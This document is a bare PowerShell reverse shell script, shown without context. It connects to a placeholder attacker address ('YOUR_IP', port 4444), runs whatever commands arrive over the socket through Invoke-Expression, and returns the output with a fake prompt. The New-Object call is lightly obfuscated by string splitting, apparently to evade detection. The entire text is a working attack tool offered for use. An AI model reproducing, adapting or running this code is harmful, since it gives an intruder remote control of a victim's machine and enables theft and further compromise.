$C = ('N'+'ew-Object') ('System.Net.Sockets.TCPClient') ('YOUR_IP',4444);
$s = $C.GetStream();
$b = 0..65535|%{0};
while(($i = $s.Read($b,0,$b.Length)) -ne 0){
$d = ([Text.Encoding]::ASCII).GetString($b,0,$i);
$r = (Invoke-Expression $d 2>&1 | Out-String);
$r2 = $r + 'PS ' + (Get-Location).Path + '> ';
$sb = ([Text.Encoding]::ASCII).GetBytes($r2);
$s.Write($sb,0,$sb.Length)
;$s.Flush()};
$C.Close()
